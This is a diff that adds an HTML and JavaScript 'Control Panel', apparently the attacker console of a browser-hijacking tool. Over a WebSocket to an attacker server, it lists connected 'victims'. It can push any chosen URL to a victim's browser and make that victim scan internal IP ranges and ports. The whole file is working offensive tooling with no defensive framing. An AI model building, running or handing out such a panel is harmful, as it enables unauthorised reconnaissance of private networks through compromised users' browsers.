@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Control Panel</title>
+  <style>
+    body {
+      font-family: sans-serif;
+      padding: 20px;
+      background-color: #f9f9f9;
+      color: #222;
+    }
+    #response {
+      background: #fff;
+      color: #000;
+      padding: 10px;
+      height: 400px;
+      overflow-y: scroll;
+      white-space: pre-wrap;
+      border: 1px solid #ccc;
+      border-radius: 4px;
+    }
+    .section {
+      margin-bottom: 20px;
+    }
+    label {
+      font-weight: bold;
+      display: inline-block;
+      margin-bottom: 5px;
+    }
+    input, select, button {
+      font-size: 14px;
+      padding: 5px;
+      margin-top: 5px;
+    }
+    button {
+      cursor: pointer;
+      margin-right: 5px;
+    }
+  </style>
+</head>
+<body>
+
+  <div class="section">
+    <label for="victimSelect">🧍 Select Victim:</label><br>
+    <select id="victimSelect">
+      <option value="">-- No victims connected --</option>
+    </select>
+  </div>
+
+  <div class="section">
+    <label for="url">🎯 Target URL:</label><br>
+    <input id="url" placeholder="https://192.168.1.124:8080/b3rito.html" size="60">
+    <button onclick="send()">Send</button>
+  </div>
+
+  <div class="section">
+    <label>Scan LAN Targets</label><br>
+    IP / Range / CIDR:
+    <input id="iprange" placeholder="192.168.1.10-20 OR 192.168.1.0/24" size="30">
+    Ports:
+    <input id="ports" placeholder="80,8080,3000-3010" size="30">
+    <button onclick="scan()">🔍 Start Scan</button>
+  </div>
+
+  <div class="section">
+    <label>📡 Log Output</label>
+    <div>
+      <button onclick="copyLog()">📋 Copy</button>
+      <button onclick="saveLog('txt')">Save .txt</button>
+      <button onclick="saveLog('json')">Save .json</button>
+    </div>
+    <pre id="response"></pre>
+  </div>
+
+  <script>
+    const socket = new WebSocket("wss://SERVER-IP:8443/ws");
+    const victimSelect = document.querySelector("#victimSelect");
+    const logOutput = document.querySelector("#response");
+    const logLines = [];
+
+    socket.onopen = () => {
+      socket.send("attacker");
+      log("[+] Attacker panel connected");
+    };
+
+    socket.onmessage = event => {
+      const msg = event.data;
+      const cleanMsg = msg.replace(/^\[victim-\d+\]\s*/, "");
+      const interesting = ["[✅]", "[📄]", "[🟢]", "[🔴]"];
+
+      if (interesting.some(prefix => cleanMsg.startsWith(prefix))) {
+        log(msg);
+      }
+
+      if (cleanMsg.startsWith("[🟢] Victim connected: ")) {
+        const match = cleanMsg.match(/Victim connected: (victim-\d+)/);
+        if (match) addVictim(match[1]);
+      }
+
+      if (cleanMsg.startsWith("[🔴] Victim disconnected: ")) {
+        const match = cleanMsg.match(/Victim disconnected: (victim-\d+)/);
+        if (match) removeVictim(match[1]);
+      }
+    };
+
+    function getSelectedVictim() {
+      return victimSelect.value;
+    }
+
+    function send() {
+      const victim = getSelectedVictim();
+      const url = document.querySelector("#url").value;
+      if (!victim) return alert("Select a victim first.");
+      socket.send(`to:${victim}|${url}`);
+    }
+
+    function scan() {
+      const victim = getSelectedVictim();
+      if (!victim) return alert("Select a victim first.");
+
+      const ipInput = document.querySelector("#iprange").value.trim();
+      const portInput = document.querySelector("#ports").value.trim();
+      const ips = expandIPRange(ipInput);
+      const ports = expandPortList(portInput);
+
+      for (const ip of ips) {
+        for (const port of ports) {
+          const url = `https://${ip}:${port}`;
+          socket.send(`to:${victim}|${url}`);
+        }
+      }
+    }
+
+    function addVictim(id) {
+      const exists = [...victimSelect.options].some(opt => opt.value === id);
+      if (!exists) {
+        const opt = document.createElement("option");
+        opt.value = id;
+        opt.textContent = id;
+        if (victimSelect.options.length === 1) victimSelect.selectedIndex = 1;
+        victimSelect.appendChild(opt);
+      }
+    }
+
+    function removeVictim(id) {
+      [...victimSelect.options].forEach(opt => {
+        if (opt.value === id) opt.remove();
+      });
+      if (victimSelect.options.length === 1) {
+        victimSelect.selectedIndex = 0;
+      }
+    }
+
+    function expandIPRange(input) {
+      if (input.includes("/")) return expandCIDR(input);
+      if (input.includes("-")) {
+        const [base, end] = input.split("-");
+        const parts = base.split(".");
+        const from = parseInt(parts[3]);
+        const to = parseInt(end);
+        const baseIP = parts.slice(0, 3).join(".");
+        const list = [];
+        for (let i = from; i <= to; i++) list.push(`${baseIP}.${i}`);
+        return list;
+      }
+      return [input];
+    }
+
+    function expandCIDR(cidr) {
+      const [ip, mask] = cidr.split("/");
+      const maskInt = parseInt(mask);
+      const ipParts = ip.split(".").map(Number);
+      const ipInt =
+        (ipParts[0] << 24) |
+        (ipParts[1] << 16) |
+        (ipParts[2] << 8) |
+        ipParts[3];
+      const hosts = 2 ** (32 - maskInt);
+      const list = [];
+      for (let i = 1; i < hosts - 1; i++) {
+        const addr = ipInt + i;
+        const a = (addr >> 24) & 0xff;
+        const b = (addr >> 16) & 0xff;
+        const c = (addr >> 8) & 0xff;
+        const d = addr & 0xff;
+        list.push(`${a}.${b}.${c}.${d}`);
+      }
+      return list;
+    }
+
+    function expandPortList(portString) {
+      const parts = portString.split(",");
+      const ports = new Set();
+      for (const part of parts) {
+        if (part.includes("-")) {
+          const [start, end] = part.split("-").map(Number);
+          for (let i = start; i <= end; i++) ports.add(i);
+        } else {
+          ports.add(parseInt(part));
+        }
+      }
+      return Array.from(ports).filter(p => !isNaN(p));
+    }
+
+    function log(msg) {
+      logLines.push(msg);
+      logOutput.textContent += msg + "\n";
+      logOutput.scrollTop = logOutput.scrollHeight;
+    }
+
+    function copyLog() {
+      navigator.clipboard.writeText(logLines.join("\n"))
+        .then(() => alert("Log copied to clipboard"))
+        .catch(() => alert("Failed to copy log"));
+    }
+
+    function saveLog(format) {
+      const timestamp = new Date().toISOString().replace(/[:.]/g, "-");
+      const filename = `log-${timestamp}.${format}`;
+      let blob;
+
+      if (format === "json") {
+        blob = new Blob([JSON.stringify(logLines, null, 2)], { type: "application/json" });
+      } else {
+        blob = new Blob([logLines.join("\n")], { type: "text/plain" });
+      }
+
+      const link = document.createElement("a");
+      link.href = URL.createObjectURL(blob);
+      link.download = filename;
+      link.click();
+    }
+  </script>
+</body>
+</html>
